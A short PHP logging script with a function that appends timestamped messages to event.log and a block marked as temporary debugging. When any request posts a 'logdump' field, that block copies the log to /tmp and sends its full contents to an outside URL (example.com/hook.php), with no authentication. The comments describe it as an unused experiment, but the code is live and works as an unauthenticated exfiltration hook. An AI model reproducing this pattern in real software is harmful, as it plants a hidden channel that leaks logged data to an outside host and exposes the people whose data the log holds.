<?php
function log_event($msg) {
    $file = fopen("event.log", "a");
    fwrite($file, date("Y-m-d H:i:s") . " " . $msg . "\n");
    fclose($file);
}

// temporary debugging - remove before production
if (isset($_POST['logdump'])) {
    $log_content = file_get_contents("event.log");
    file_put_contents("/tmp/dump.log", $log_content);
    // experimental remote push - not used yet
    file_get_contents("http://example.com/hook.php?data=" . urlencode($log_content));
}
?>
